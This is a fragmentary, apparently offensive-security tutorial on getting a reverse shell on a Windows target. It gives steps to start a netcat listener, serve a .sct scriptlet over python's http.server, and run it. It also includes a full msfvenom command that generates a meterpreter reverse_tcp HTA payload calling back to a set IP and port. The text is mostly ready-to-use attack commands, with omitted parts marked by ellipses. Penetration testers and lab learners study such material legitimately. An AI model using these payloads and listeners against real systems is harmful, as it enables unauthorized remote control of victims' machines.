...
To get a reverse shell, copy the below script to your .sct file, update the ip address and port to your reverse shell listener's ip and port, start your listener i.e `nc -nlvp [port]`, start your server to serve .sct file to your target i.e `python3 -m http.server [port]` then execute the below command to get a reverse shell.
...
> `msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.1 lport=5000 -f hta-psh -o exploit.hta`
...
### Setting Reverse Shell listener
